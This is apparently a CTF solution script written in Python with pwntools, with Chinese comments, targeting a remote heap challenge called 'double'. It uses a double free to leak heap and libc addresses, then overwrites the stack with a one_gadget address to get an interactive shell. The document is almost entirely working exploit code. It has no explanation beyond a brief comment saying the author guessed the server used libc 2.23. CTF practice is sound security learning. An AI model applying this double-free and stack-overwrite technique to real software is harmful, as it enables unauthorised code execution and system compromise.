from pwn import *
libc=ELF('./libc.so.6')#这题是靠猜他的环境是libc2.23才做出来的，正常做到最后会进一个栈题，但是想方设法都构造不好，只能这样做了，题目给的后门函数太难利用，得到onegadget后直接用更容易
# p=process('./double')
p=remote('59.110.164.72',10021)
# gdb.attach(p,'b *0x0000000000400934')
# context.log_level='debug'
context.arch='amd64'
pause()

0x6020E0
print("0x6020E0",hex(0x6024E0))
print("editaddr 0x602228")

def create(index,size):
    p.recvuntil(str("请选择：").encode())
    p.sendline(b'1')
    p.recvuntil(str('请输入序号：').encode())
    p.sendline(str(index).encode())
    p.recvuntil(str('请输入大小：').encode())
    p.sendline(str(size).encode())
def edit(index,content):
    p.recvuntil(str("请选择：").encode())
    p.sendline(b'4')
    p.recvuntil(str("请输入序号：").encode())
    p.sendline(str(index).encode())
    p.recvuntil(str('请输入编辑内容：').encode())
    p.sendline(str(content).encode())
def editb(index,content):
    p.recvuntil(str("请选择：").encode())
    p.sendline(b'4')
    p.recvuntil(str("请输入序号：").encode())
    p.sendline(str(index).encode())
    p.recvuntil(str('请输入编辑内容：').encode())
    p.sendline(content)
def show(index):
    p.recvuntil(str("请选择：").encode())
    p.sendline(b'3')
    p.recvuntil(str("请输入序号：").encode())
    p.sendline(str(index).encode())
def del_(index):
    p.recvuntil(str("请选择：").encode())
    p.sendline(b'2')
    p.recvuntil(str("请输入序号：").encode())
    p.sendline(str(index).encode())
def quit_():
    p.recvuntil(str("请选择：").encode())
    p.sendline(b'5')

create(66,0x15CC15CC)
create(3,0x20)
create(4,0x20)
create(10,0x20)
del_(3)
del_(4)
del_(3)
create(0,0x20)
show(0)
heap_addr=u64(p.recv(6).ljust(8,b'\x00'))
print("heap",hex(heap_addr))
create(1,0x20)
payload=p8(0x10)+p8(0x22)+p8(0x60)+p8(0)*15
editb(1,payload)
create(2,0x20)
create(78,0x31)
# create(80,0x606060)

create(5,0x20)
create(6,0x20)

create(7,0x440)
create(8,0x20)
del_(7)
create(7,0x200)
show(7)
libc_addr=u64(p.recv(6).ljust(8,b'\x00'))
print("libc",hex(libc_addr))
libc_base=libc_addr+6192-libc.sym['__free_hook']
print("libc_base",hex(libc_base))
payload=p8(0)*8+p8(0x51)+p8(0xcc)+p8(0x51)+p8(0xcc)
editb(6,payload)
context.log_level='debug'
quit_()
p.recvuntil(b'reward: 0x')
stack_addr=int(p.recv(12),16)
print("stack",hex(stack_addr))
p.recvuntil(b'say:\n')
context.log_level='notset'
backdoor=0x00000000004008EC
ret_addr=0x0000000000400A23
new_back=0xf03a4+libc_base
print('back',hex(new_back))
payload=b'/bin/sh\x00'.ljust(8,b'\x00')+p64(0)*3+p64(stack_addr+0x30)+p64(stack_addr+0x60)*1+p64(ret_addr)+p64(new_back)
p.sendline(payload)

p.interactive()